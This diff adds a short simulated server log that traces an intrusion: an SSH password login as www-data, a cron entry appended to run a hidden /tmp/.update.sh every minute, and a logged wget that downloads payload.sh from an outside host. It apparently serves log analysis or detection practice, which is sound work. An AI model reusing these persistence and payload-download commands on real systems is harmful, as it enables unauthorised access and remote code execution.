@@ -1,0 +1,21 @@
+Feb 15 13:55:01 webserver sshd[5021]: Accepted password for www-data from 203.0.113.190 port 57111 ssh2
+Feb 15 13:55:01 webserver sshd[5021]: pam_unix(sshd:session): session opened for user www-data by (uid=0)
+
+Feb 15 13:55:10 webserver CRON[5030]: (www-data) CMD (echo '* * * * * /tmp/.update.sh' >> /var/spool/cron/crontabs/www-data)
+Feb 15 13:55:11 webserver audit[5032]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0="/var/spool/cron/crontabs/www-data" a1=O_WRONLY|O_APPEND a2=0600
+Feb 15 13:55:11 webserver audit[5032]: PATH item=0 name="/var/spool/cron/crontabs/www-data" inode=492001 dev=08:01 mode=0100600 ouid=33 ogid=33
+
+Feb 15 13:56:01 webserver CRON[5045]: (www-data) CMD (/tmp/.update.sh)
+Feb 15 13:56:01 webserver audit[5046]: EXECVE argc=2 a0="/bin/bash" a1="/tmp/.update.sh"
+Feb 15 13:56:01 webserver audit[5046]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55b8c2f0 a1=55b8c310 a2=55b8c330 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 13:56:02 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=185.203.116.55 LEN=60 TOS=0x00 TTL=64 ID=72001 PROTO=TCP SPT=41221 DPT=8080
+Feb 15 13:56:03 webserver syslog: bash[5046]: wget http://185.203.116.55/payload.sh -O /tmp/payload.sh
+
+Feb 15 13:57:01 webserver CRON[5060]: (www-data) CMD (/tmp/.update.sh)
+Feb 15 13:57:01 webserver audit[5061]: EXECVE argc=2 a0="/bin/bash" a1="/tmp/.update.sh"
+
+Feb 15 13:58:01 webserver CRON[5075]: (www-data) CMD (/tmp/.update.sh)
+Feb 15 13:58:01 webserver audit[5076]: EXECVE argc=2 a0="/bin/bash" a1="/tmp/.update.sh"
+
+Feb 15 13:59:00 webserver sshd[5021]: pam_unix(sshd:session): session closed for user www-data
